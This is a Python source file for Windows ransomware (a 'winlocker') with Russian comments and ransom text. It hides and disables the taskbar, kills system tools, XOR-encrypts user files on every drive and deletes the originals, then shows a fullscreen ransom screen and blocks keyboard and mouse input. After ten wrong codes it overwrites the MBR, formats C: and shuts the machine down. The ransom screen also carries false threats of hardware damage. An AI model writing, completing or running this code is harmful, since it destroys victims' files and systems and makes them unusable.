import os
import sys
import time
import ctypes
import tkinter as tk
from tkinter import font
import subprocess
import string

# === БЛОКИРОВКА ПАНЕЛИ ЗАДАЧ ===
class TaskbarBlocker:
    @staticmethod
    def hide_taskbar():
        """Скрывает панель задач"""
        try:
            # Находим окно панели задач
            hwnd = ctypes.windll.user32.FindWindowW('Shell_TrayWnd', None)
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 = скрыть
            
            # Скрываем кнопку Пуск (для Windows 10/11)
            hwnd_start = ctypes.windll.user32.FindWindowW('Button', None)
            if hwnd_start:
                ctypes.windll.user32.ShowWindow(hwnd_start, 0)
        except:
            pass
    
    @staticmethod
    def disable_taskbar():
        """Полностью отключает панель задач через реестр"""
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "NoSetTaskbar", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass

# === ПРОСТОЕ ШИФРОВАНИЕ XOR ===
class SimpleEncryptor:
    def __init__(self):
        self.key = b'DeadLock_V1_2024_8880'
        
    def xor_encrypt(self, data):
        encrypted = bytearray()
        key_len = len(self.key)
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.key[i % key_len])
        return bytes(encrypted)
    
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = self.xor_encrypt(data)
            with open(file_path + '.locked', 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
            return True
        except:
            return False
    
    def encrypt_drives(self):
        target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp3', '.mp4',
            '.zip', '.rar', '.7z', '.py', '.cpp', '.c', '.java',
            '.sql', '.db', '.psd', '.ai', '.cdr', '.dwg', '.dxf',
            '.pak', '.dat', '.sav', '.cfg', '.ini', '.exe'
        ]
        
        drives = []
        for d in string.ascii_uppercase:
            if os.path.exists(d + ':\\'):
                drives.append(d + ':\\')
        
        exclude_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 
                       'System Volume Information', '$Recycle.Bin']
        
        for drive in drives:
            try:
                for root, dirs, files in os.walk(drive):
                    if any(exclude in root for exclude in exclude_dirs):
                        continue
                    for file in files:
                        ext = os.path.splitext(file)[1].lower()
                        if ext in target_extensions:
                            file_path = os.path.join(root, file)
                            self.encrypt_file(file_path)
            except:
                continue

# === УНИЧТОЖЕНИЕ MBR ===
class MBRDestroyer:
    @staticmethod
    def destroy():
        try:
            with open(r'\\.\PhysicalDrive0', 'rb+') as mbr:
                mbr.write(b'\x00' * 512)
        except:
            pass

# === БЛОКИРОВКА СИСТЕМЫ ===
class SystemLocker:
    @staticmethod
    def block_input():
        ctypes.windll.user32.BlockInput(True)
    
    @staticmethod
    def unblock_input():
        ctypes.windll.user32.BlockInput(False)
    
    @staticmethod
    def kill_processes():
        processes = ['taskmgr.exe', 'regedit.exe', 'cmd.exe', 'powershell.exe',
                    'explorer.exe']  # Убиваем проводник (перезагрузит панель задач)
        for proc in processes:
            try:
                subprocess.run(['taskkill', '/f', '/im', proc], 
                             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass

# === ОСНОВНОЙ ВИНЛОКЕР (БЕЗ КОНТАКТОВ) ===
class FinalLocker:
    def __init__(self):
        self.password = '8880'
        self.attempts = 0
        self.max_attempts = 10
        self.root = None
        
    def run(self):
        # Скрываем консоль
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Блокируем панель задач
        TaskbarBlocker.hide_taskbar()
        TaskbarBlocker.disable_taskbar()
        
        # Убиваем проводник (чтобы панель точно исчезла)
        SystemLocker.kill_processes()
        
        # Шифруем файлы
        encryptor = SimpleEncryptor()
        encryptor.encrypt_drives()
        
        # Создаем окно
        self.create_window()
    
    def create_window(self):
        self.root = tk.Tk()
        self.root.title('')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        self.root.overrideredirect(True)
        
        # Шрифты
        ascii_font = font.Font(family='Courier New', size=14)
        
        # === ВЕРХНЯЯ ЧАСТЬ ===
        y_pos = 30
        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║                                                              ║",
            "║              ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ!                        ║",
            "║                                                              ║",
            "╠══════════════════════════════════════════════════════════════╣",
            "║                                                              ║",
            "║  Упс! Вы подверглись масштабной хакерской атаке и теперь    ║",
            "║  ваш компьютер заблокирован, а все имеющиеся диски и        ║",
            "║  файлы на них зашифрованы хакерской группировкой.           ║",
            "║                                                              ║",
            "║  Любые действия, связанные с попыткой обмануть систему      ║",
            "║  приведут к необратимому повреждению вашего компьютера      ║",
            "║  и потере всех файлов без возможности восстановления.       ║",
            "║                                                              ║",
            "║  При попытке снять блокировку MBR будет уничтожен, а        ║",
            "║  процессор получит необратимые повреждения.                 ║",
            "║                                                              ║",
            "║  У вас есть 45 часов с момента запуска чтобы ввести код.    ║",
            "║                                                              ║",
            "╠══════════════════════════════════════════════════════════════╣",
            "║                                                              ║",
            "║  Введите код разблокировки:                                 ║",
            "║                                                              ║",
        ]
        
        for line in lines:
            if "ЗАШИФРОВАНЫ" in line:
                fg_color = '#ff0000'
            else:
                fg_color = '#ffffff'
                
            tk.Label(self.root,
                    text=line,
                    font=ascii_font,
                    fg=fg_color,
                    bg='black',
                    justify='left').pack()
        
        # === ПОЛЕ ВВОДА ===
        input_frame = tk.Frame(self.root, bg='black')
        input_frame.pack(pady=10)
        
        self.password_var = tk.StringVar()
        self.entry = tk.Entry(input_frame,
                              font=('Courier New', 20),
                              show='*',
                              textvariable=self.password_var,
                              width=10,
                              justify='center',
                              bg='#222222',
                              fg='#00ff00',
                              insertbackground='#00ff00',
                              bd=3)
        self.entry.pack(side='left', padx=10)
        self.entry.focus_set()
        
        # Только цифры
        def validate_input(char):
            return char.isdigit()
        
        vcmd = self.root.register(validate_input)
        self.entry.config(validate='key', validatecommand=(vcmd, '%S'))
        
        # Enter для проверки
        self.entry.bind('<Return>', self.check_password)
        
        # === ИНФОРМАЦИЯ О ПК ===
        pc_info = f"Current PC: {os.getenv('COMPUTERNAME', 'UNKNOWN')}\\PC{self.attempts + 1}"
        tk.Label(self.root,
                text=pc_info,
                font=('Courier New', 12),
                fg='#888888',
                bg='black').pack(pady=10)
        
        # === Enter [8880] ===
        tk.Label(self.root,
                text=f"Enter [{self.password}]",
                font=('Courier New', 12),
                fg='#888888',
                bg='black').pack()
        
        # === СЧЕТЧИК ПОПЫТОК ===
        self.attempts_label = tk.Label(self.root,
            text=f"Попыток: {self.attempts}/{self.max_attempts}",
            font=('Courier New', 12),
            fg='yellow',
            bg='black')
        self.attempts_label.pack(pady=10)
        
        # === СООБЩЕНИЯ ===
        self.message_label = tk.Label(self.root,
                                      text='',
                                      font=('Courier New', 12),
                                      fg='orange',
                                      bg='black')
        self.message_label.pack()
        
        # === НИЖНЯЯ ЧАСТЬ ===
        tk.Label(self.root,
                text="╚══════════════════════════════════════════════════════════════╝",
                font=ascii_font,
                fg='#ffffff',
                bg='black').pack(side='bottom', pady=20)
        
        # Защита от закрытия
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Control-KeyPress>', lambda e: 'break')
        self.root.bind('<Alt-KeyPress>', lambda e: 'break')
        self.root.bind('<F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        
        # Блокируем ввод мыши/клавиатуры
        SystemLocker.block_input()
        
        # Периодически проверяем и скрываем панель задач
        self.hide_taskbar_periodically()
        
        self.root.mainloop()
    
    def hide_taskbar_periodically(self):
        """Периодически скрывает панель задач"""
        TaskbarBlocker.hide_taskbar()
        # Вызываем снова через 1 секунду
        self.root.after(1000, self.hide_taskbar_periodically)
    
    def check_password(self, event):
        entered = self.password_var.get()
        
        if entered == self.password:
            self.message_label.config(text='ДОСТУП ВОССТАНОВЛЕН!', fg='green')
            self.root.update()
            time.sleep(3)
            SystemLocker.unblock_input()
            self.root.quit()
            sys.exit(0)
        else:
            self.attempts += 1
            self.attempts_label.config(text=f"Попыток: {self.attempts}/{self.max_attempts}")
            self.password_var.set('')
            
            if self.attempts >= self.max_attempts:
                self.message_label.config(text='!!! ПОПЫТКИ ИСЧЕРПАНЫ !!!', fg='red')
                self.root.update()
                time.sleep(2)
                self.root.destroy()
                MBRDestroyer.destroy()
                # Форматирование диска
                try:
                    subprocess.run(['format', 'C:', '/q', '/y'], 
                                 capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass
                os.system('shutdown /p /f')
            else:
                self.message_label.config(
                    text=f'НЕВЕРНЫЙ КОД! ОСТАЛОСЬ: {self.max_attempts - self.attempts}',
                    fg='orange')
                self.entry.focus_set()

# === ЗАПУСК ===
if __name__ == '__main__':
    if ctypes.windll.shell32.IsUserAnAdmin():
        locker = FinalLocker()
        locker.run()
    else:
        ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, ' '.join(sys.argv), None, 1
        )